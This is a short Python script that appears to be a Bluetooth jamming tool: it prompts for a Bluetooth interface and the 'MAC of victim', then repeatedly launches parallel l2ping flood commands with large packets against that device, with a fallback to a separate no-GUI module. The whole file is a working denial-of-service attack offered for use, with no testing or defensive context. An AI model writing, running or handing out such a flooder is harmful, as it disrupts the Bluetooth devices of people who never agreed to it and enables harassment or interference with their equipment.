import os
import subprocess
import no_gui
import time
import colorama
from colorama import Fore, Back, Style
import headers
import random
colorama.init(autoreset=True)

headers.header()

def main():
    clear = "clear"
    subprocess.Popen(clear, shell=True)
    headers.header()
    print("GUI Version")
    print(" ")
    interface = input("Your BT interface : ")
    mac = input("MAC of victim: ")
    time = 999
    print("Start jamming...")
    delay = int(time)

    while delay != 0:
        xterm_1 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
        xterm_2 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
        xterm_3 = "xterm -e 'timeout 2s l2ping -i %s -s 600 -f %s '" % (interface , mac)
        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        delay -= 1

choose = input("Do you have GUI? y/N ")
if choose == "y" or choose == "Y" :
    main()
elif choose == "n" or choose == "N":
    no_gui.no_gui()
else:
    print("ERROR")
    print("Executing no GUI version")
    no_gui.no_gui()
